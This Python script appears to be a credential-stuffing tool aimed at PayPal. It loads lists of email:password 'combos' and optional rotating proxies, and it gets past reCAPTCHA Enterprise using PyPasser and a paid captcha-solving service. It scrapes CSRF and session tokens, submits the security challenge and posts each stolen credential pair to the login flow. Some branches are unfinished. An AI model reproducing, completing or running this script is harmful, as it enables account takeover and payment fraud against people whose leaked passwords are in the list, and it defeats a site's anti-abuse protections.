import time
import random
import logging
from pypasser import reCaptchaV3
import requests
import re

COMBO_FILE = "combo.txt"      
PROXY_FILE = "proxy.txt"      
LOG_FILE   = "paypal_bypass.log"
MAX_RETRIES = 2        
RETRY_DELAY = 5        
DEBUG_RESPONSES = True 
ANCHOR_URL = "https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k=6LfY0gUpAAAAAJgmuiSZtM8qB73-AGXlxhWx1xCy&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=en&v=ItfkQiGBlJDHuTkOhlT3zHpB&size=invisible&cb=591ahzleh0wk"
SITE_KEY   = "6LfY0gUpAAAAAJgmuiSZtM8qB73-AGXlxhWx1xCy"

def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    logging.getLogger().addHandler(logging.StreamHandler())

    with open(LOG_FILE, 'w') as log_file:
        log_file.write("")

    logging.info("Logging initialized.")
def load_combos():
    combos = []
    with open(COMBO_FILE) as f:
        for L in f:
            L = L.strip()
            if not L or ":" not in L: continue
            combos.append(tuple(L.split(":",1)))
    logging.info(f"Loaded {len(combos)} combos")
    return combos

def load_proxies():
    proxies = []
    with open(PROXY_FILE) as f:
        for L in f:
            L = L.strip()
            if not L: continue
            h,p,u,ps = L.split(":",3)
            proxies.append(f"http://{u}:{ps}@{h}:{p}")
    logging.info(f"Loaded {len(proxies)} proxies")
    return proxies

def pick_proxy(proxies):
    return random.choice(proxies) if proxies else None


def solve_recaptcha(anchor_url):
    logging.info(f"Solving captcha via PyPasser at anchor: {anchor_url}")
    try:
        # Check if this is the security challenge (second) captcha
        if "6LeZ6egUAAAAAGwL8CjkDE8dcSw2DtvuVpdwTkwG" in anchor_url:
            # This is the security challenge captcha - use an alternative solution
            from anticaptchaofficial.recaptchav2enterpriseproxyless import recaptchaV2EnterpriseProxyless
            
            solver = recaptchaV2EnterpriseProxyless()
            solver.set_verbose(1)
            solver.set_key("YOUR_ANTI_CAPTCHA_KEY")  # Use a paid service
            solver.set_website_url("https://www.paypal.com")
            solver.set_website_key("6LeZ6egUAAAAAGwL8CjkDE8dcSw2DtvuVpdwTkwG")
            
            token = solver.solve_and_return_solution()
            if token:
                logging.info("Received g-recaptcha-response token via AntiCaptcha")
                return token
            else:
                logging.error(f"AntiCaptcha error: {solver.error_code}")
                return None
        else:
            # This is the first captcha, use V3 as before
            token = reCaptchaV3(anchor_url)
            logging.info("Received g-recaptcha-response token via V3")
            return token
    except Exception as e:
        logging.exception(f"Captcha solving failure: {e}")
        return None
def do_checkout(email, password, proxy, anchor_url, site_key):
    session = requests.Session()
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
        logging.info(f"[{email}] Using proxy {proxy}")

    # Step 1: visit PayPal homepage to set cookie domain
    logging.info(f"[{email}] Visiting paypal.com to prime cookies")
    r = session.get("https://www.paypal.com")
    r.raise_for_status()

    # Step 2: solve captcha
    token = solve_recaptcha(anchor_url)
    if not token:
        logging.error(f"[{email}] Could not solve captcha, skipping")
        return

    # Step 3: craft POST payload exactly as before, plus g‑recaptcha‑response
    payload = {
        "cmd":            "_s-xclick",
        "hosted_button_id":"L2UCBAKF4SB9A",
        "on0":            "Duration",
        "os0":            "One Month",
        "custom":         "3Vv4lokLpdaWaVwIoEsl%2FA%3D%3D",
        "currency_code":  "USD",
        "submit.x":       "0",
        "submit.y":       "0",
        "g-recaptcha-response": token
    }

    headers = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/123.0.0.0 Safari/537.36",
        "Accept":          "application/json",
        "Content-Type":    "application/x-www-form-urlencoded",
        "Cookie":          f"login_email={email}"
    }

    logging.info(f"[{email}] Submitting checkout POST")
    r = session.post("https://www.paypal.com/cgi-bin/webscr",
                     data=payload, headers=headers)
    logging.info(f"[{email}] Response {r.status_code} → {r.url}")
    logging.debug(f"[{email}] Response body: {r.text[:500]}")
    try:
        j = r.json()
        logging.debug(f"[{email}] Response keys: {list(j.keys())}")
        
        if "flowExecutionUrl" in j:
            # Original flow continues here...
            login_url = "https://paypal.com" + j["flowExecutionUrl"]
            login_page = session.get(login_url)
            login_page.raise_for_status()
            html = login_page.text
        elif "htmlResponse" in j:
            # Handle Security Challenge page
            logging.info(f"[{email}] Security Challenge detected, attempting to solve...")
            html = j["htmlResponse"]
            
            # Extract the form action URL
            form_action = re.search(r'<form\s+[^>]*action="([^"]+)"', html)
            if not form_action:
                logging.error(f"[{email}] Could not find form action in security challenge")
                return
                
            validate_url = "https://www.paypal.com" + form_action.group(1)
            logging.info(f"[{email}] Validation URL: {validate_url}")
            
            # Continue with captcha solving and form submission...
        else:
            logging.error(f"[{email}] Unexpected response structure: {j}")
            return
    except (ValueError, KeyError) as e:
        logging.error(f"[{email}] Error processing checkout response: {e}")
        logging.debug(f"[{email}] Response body: {r.text[:1000]}")
        return    # Extract required form values
    try:
        csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', html).group(1)
        session_id = re.search(r'name="_sessionID"\s+value="([^"]+)"', html).group(1)
        
        # First try to find the standalone captcha div
        captcha_div = re.search(r'<div[^>]+id="captcha-standalone"[^>]+data-jse="([^"]+)"[^>]+data-csrf="([^"]+)"[^>]+data-sessionid="([^"]+)"', html)
        if not captcha_div:
            # Try alternative regex pattern with different attribute order
            captcha_div = re.search(r'<div[^>]+id="captcha-standalone".*?data-jse="([^"]+)".*?data-csrf="([^"]+)".*?data-sessionid="([^"]+)"', html)

        
        if captcha_div:
            # Extract data from the standalone captcha
            jse_val = captcha_div.group(1)
            csrf_val = captcha_div.group(2)
            session_val = captcha_div.group(3)
            
            # Look for captcha site key from the page
            site_key_match = re.search(r'value="true"/><input type="hidden" name="_adsRecaptchaSiteKey" value="([^"]+)"', html)
            if site_key_match:
                site_key2 = site_key_match.group(1)
            else:
                site_key2 = SITE_KEY  # Default from logs
            
                        # Extract all required hidden fields
            csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', html).group(1)
            request_id = re.search(r'name="_requestId"\s+value="([^"]+)"', html).group(1)
            hash_val = re.search(r'name="_hash"\s+value="([^"]+)"', html).group(1)
            session_id = re.search(r'name="_sessionID"\s+value="([^"]+)"', html).group(1)
            
            # Get start time if present
            start_time_match = re.search(r'name="grc_eval_start_time_utc"\s+value="([^"]+)"', html)
            start_time = start_time_match.group(1) if start_time_match else str(int(time.time() * 1000))
            # Construct enterprise anchor URL manually
            anchor2 = f"https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k={site_key2}&co=aHR0cHM6Ly93d3cucGF5cGFsLmNvbTo0NDM&hl=en&v=ItfkQiGBlJDHuTkOhlT3zHpB&size=normal"
            logging.info(f"[{email}] Solving security challenge captcha with site key: {site_key2}")
        else:
            # Fall back to the iframe method as before
            m = re.search(
                r'<iframe[^>]+src="(https?://[^"]*recaptcha/enterprise/anchor\?[^"]+)"',
                html
            )
            if not m:
                # Try another approach - look for recaptcha script
                script_match = re.search(r'src="(https://www\.google\.com/recaptcha/enterprise/[^"]+)"', html)
                if script_match:
                    # Extract site key from HTML
                    key_match = re.search(r'data-sitekey="([^"]+)"', html)
                    if key_match:
                        site_key2 = key_match.group(1)
                        anchor2 = f"https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k={site_key2}&co=aHR0cHM6Ly93d3cucGF5cGFsLmNvbTo0NDM&hl=en&v=ItfkQiGBlJDHuTkOhlT3zHpB&size=invisible"
                        logging.info(f"[{email}] Constructed captcha URL from script tag")
                    else:
                        logging.error(f"[{email}] Couldn't find captcha site key")
                        return
                else:
                    logging.error(f"[{email}] Couldn't find any recaptcha elements in login HTML")
                    logging.debug(f"[{email}] HTML snippet: {html[:1000]}")
                    return
            else:
                anchor2 = m.group(1)
                
        # Get token using the discovered anchor URL
        logging.info(f"[{email}] Using anchor URL: {anchor2}")
        token2 = solve_recaptcha(anchor2)
        if not token2:
            logging.error(f"[{email}] 2nd captcha failed")
            return
    except Exception as e:
        logging.exception(f"[{email}] Error extracting login form data: {e}")
        return
    # Prepare form data for submission
    challenge_payload = {
        "_csrf": csrf,
        "_requestId": request_id,
        "_hash": hash_val,
        "_sessionID": session_id,
        "grc_eval_start_time_utc": start_time,
        "g-recaptcha-response": token2
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": r.url
    }
    # Submit the captcha challenge form
    logging.info(f"[{email}] Submitting security challenge form")
    r3 = session.post(validate_url, data=challenge_payload, headers=headers)
    logging.info(f"[{email}] Security challenge response: {r3.status_code} → {r3.url}")

    # Follow redirect if needed
    if r3.is_redirect or r3.status_code in (301, 302, 303, 307, 308):
        redirect_url = r3.headers.get('Location')
        logging.info(f"[{email}] Following redirect to: {redirect_url}")
        r3 = session.get(redirect_url)

    # Check if we successfully authenticated
    if "flowExecutionUrl" in r3.text or "/webapps/hermes" in r3.url:
        logging.info(f"[{email}] Successfully passed security challenge!")
        if "flowExecutionUrl" in r3.text:
            login_json = r3.json()
            login_url = "https://paypal.com" + login_json["flowExecutionUrl"]
            payload = {
                "login_email":          email,
                "login_password":       password,
                "_csrf":                csrf,
                "_sessionID":           session_id
            }
    else:
        logging.error(f"[{email}] Failed to pass security challenge")
        logging.debug(f"[{email}] Response: {r3.text[:500]}")
    if 'login_url' in locals():
        payload = {
            "login_email":          email,
            "login_password":       password,
            "_csrf":                csrf,
            "_sessionID":           session_id,
            "g-recaptcha-response": token2
        }
        headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            # session will carry your cookies automatically
        })

        r2 = session.post(login_url, data=payload, headers=headers)
        r2.raise_for_status()
        checkout_page = r2
        if checkout_page.is_redirect:
            checkout_page = session.get(checkout_page.headers["Location"])


def main():
    setup_logging()
    combos = load_combos()
    
    use_proxies = False  # default to False
    # use_proxies = input("Do you want to use proxies? (yes/no): ").strip().lower() == "yes"
    
    proxies = []
    if use_proxies:
        proxies = load_proxies()
        logging.info("Proxy usage enabled.")
    else:
        logging.info("Proxy usage disabled.")

    # if you prefer prompting at runtime:
    anchor = ANCHOR_URL or input("Anchor URL: ").strip()
    key = SITE_KEY or input("Site key: ").strip()

    for email, pwd in combos:
        # Only pick a proxy if proxy usage is enabled
        proxy = None
        if use_proxies:
            proxy = pick_proxy(proxies)
            
        try:
            do_checkout(email, pwd, proxy, anchor, key)
        except Exception:
            logging.exception(f"Fatal error for {email}")
        time.sleep(2)

    logging.info("All done.")
    #dont exit the script, just wait for user to close it
    input("Press Enter to exit...")
if __name__ == "__main__":
    main()

